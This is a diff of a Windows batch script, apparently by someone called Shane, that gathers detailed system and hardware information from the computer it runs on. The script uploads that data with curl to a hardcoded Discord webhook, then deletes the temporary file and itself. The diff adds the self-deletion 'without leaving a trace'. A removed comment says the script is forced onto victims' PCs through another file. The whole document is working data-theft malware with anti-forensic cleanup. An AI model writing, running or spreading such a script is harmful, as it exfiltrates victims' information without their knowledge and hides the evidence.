@@ -1,6 +1,6 @@
-#Grabs data other file forces this download onto the pc and goes to my webhook
 @echo off
 echo Hello! Made by Shane.
+
 :: Collect detailed system information
 echo System Information > sysinfo.txt
 systeminfo >> sysinfo.txt
@@ -51,12 +51,13 @@ echo Memory Information >> sysinfo.txt
 wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt
 
 :: Set webhook URL
-set "https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"
 
 :: Use curl to send the file with --ssl-no-revoke flag
 curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%
 
-:: Clean up
+:: Clean up sysinfo.txt
 del sysinfo.txt
 
-pause
+:: Self-delete the batch file without leaving a trace
+(goto) 2>nul & del "%~f0"
